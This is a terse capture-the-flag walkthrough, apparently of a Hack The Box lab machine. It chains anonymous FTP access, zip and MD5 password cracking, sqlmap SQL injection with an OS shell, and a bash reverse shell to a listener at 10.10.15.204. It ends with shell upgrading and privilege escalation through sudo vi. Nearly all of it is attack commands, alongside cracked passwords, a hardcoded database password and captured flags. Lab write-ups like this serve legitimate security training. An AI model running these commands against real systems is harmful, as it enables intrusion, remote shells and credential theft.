# Enumerate services with `nmap 10.129.251.16 -p1-1000 -sC -sV`
```
21 ftp
```

# Log to ftp and extract the file
```
log with 'anonymous'
password is blank or 'anonymous'

ls
get backup.zip
```

# Unzip backup.zip
```
unzip backup.zip [requires password]
john2zip backup.zip > hash
john --wordlist=~/Wordlists/rockyou.txt hash
```

# Check `index.php`
```
if($_POST['username'] === 'admin' && md5($_POST['password']) === "2cb42f8734ea607eefed3b70af13bbd3")
after brute forcing the md5 hash finding that the password is 'qwerty789'
```

# Enter the website and try to search something
```
find the url get variable `search`
http://10.129.251.16/dashboard.php?search=<field>
```

# One Terminal
```
python3 ./sqlmap.py -u http://10.129.251.16/dashboard.php?search=random --cookie="PHPSESSID=l65vchd80b8mademtsqvn774f9" --os-shell
bash -c "bash -i >& /dev/tcp/10.10.15.204/9999 0>&1"
```

# Second Terminal
```
nc -lnvp 9999
python3 -c 'import pty;pty.spawn("/bin/bash")'
[Ctrl + Z]
stty raw -echo
fg
export XTERM=xterm
```

# user.txt
```
ec9b13ca4d6229cd5cc1e09980965bf7
```

# At /var/www/html/dashboard.php | grep postgress
```php
$conn = pg_connect("host=localhost port=5432 dbname=carsdb user=postgres password=P@s5w0rd!");
```

# Exec `sudo -l`
```
(ALL) /bin/vi /etc/postgresql/11/main/pg_hba.conf
```

## Use !sh to privesc..

# root.txt
```
dd6e058e814260bc70e9bbdef2715849
```